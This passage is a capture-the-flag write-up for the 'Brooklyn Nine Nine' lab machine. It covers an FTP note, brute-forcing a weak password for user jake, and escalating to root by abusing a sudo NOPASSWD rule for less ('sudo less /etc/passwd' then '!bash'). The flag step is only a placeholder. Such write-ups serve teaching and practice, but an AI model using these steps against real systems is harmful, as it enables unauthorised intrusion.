Contents:

From Amy,

Jake please change your password. It is too weak and Holt will be mad if someone hacks into the nine nine


💡 Clue: User jake with a weak password.

3. Exploitation

Tried logging in as jake → password was weak / found via brute force.

Successfully gained access as user jake.

4. Privilege Escalation

Checked sudo -l:

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less


Exploited less to spawn root shell:

sudo less /etc/passwd
!bash


Confirmed root:

whoami
# root

5. Root Flag

Navigated to /root/flag.txt (example, replace with real flag location).

Retrieved the root flag. 🎉

6. Lessons Learned

Weak passwords → always exploitable via brute force.

Anonymous FTP is dangerous → leads to information disclosure.

Misconfigured sudo (NOPASSWD for interactive programs like less, vim, nano) → instant root escalation.
